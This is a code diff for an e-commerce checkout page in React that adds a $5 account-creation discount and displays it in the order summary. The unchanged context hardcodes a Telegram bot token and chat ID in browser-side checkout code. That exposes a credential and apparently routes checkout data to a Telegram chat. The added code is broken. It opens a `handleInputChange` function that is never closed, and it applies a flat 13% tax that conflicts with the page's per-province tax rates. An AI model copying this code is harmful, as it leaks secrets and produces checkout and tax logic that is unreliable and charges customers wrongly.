@@ -44,6 +44,7 @@ export default function CheckoutPage() {
   const [isCreatingAccount, setIsCreatingAccount] = useState(false)
   const [accountCreated, setAccountCreated] = useState(false)
   const [accountError, setAccountError] = useState("")
+  const [discountApplied, setDiscountApplied] = useState(false)
   const [isProcessing, setIsProcessing] = useState(false)
   const [showDatePicker, setShowDatePicker] = useState(false)
   const [selectedDay, setSelectedDay] = useState('')
@@ -53,9 +54,17 @@ export default function CheckoutPage() {
   const [honeypot, setHoneypot] = useState('')
   const [formLoadTime] = useState(Date.now())
 
+  // Calculate discount
+  const discountAmount = discountApplied ? 5 : 0
+  const discountedTotal = Math.max(0, total - discountAmount)
+  const taxes = discountedTotal * 0.13
+  const finalTotal = discountedTotal + taxes
+
   // Telegram configuration
   const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
   const TELEGRAM_CHAT_ID = '-5217100062'
+
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
 
   // Province tax rates
   const getProvinceTaxRate = (province: string) => {
@@ -265,6 +274,9 @@ export default function CheckoutPage() {
         ...prev,
         email: accountFormData.email
       }))
+      
+      // Apply $5 discount
+      setDiscountApplied(true)
       
       setAccountCreated(true)
       setIsCreatingAccount(false)
@@ -1126,6 +1138,12 @@ LAST UPDATE:
                   <span className="text-neutral-400">{isFr ? 'Sous-total' : 'Subtotal'}</span>
                   <span className="font-medium">{formatPrice(total)}</span>
                 </div>
+                {discountApplied && (
+                  <div className="flex justify-between">
+                    <span className="text-green-600">{isFr ? 'Rabais compte' : 'Account Discount'}</span>
+                    <span className="font-medium text-green-600">-{formatPrice(discountAmount)}</span>
+                  </div>
+                )}
                 <div className="flex justify-between">
                   <span className="text-neutral-400">{isFr ? 'Livraison' : 'Shipping'}</span>
                   <span className="font-medium">
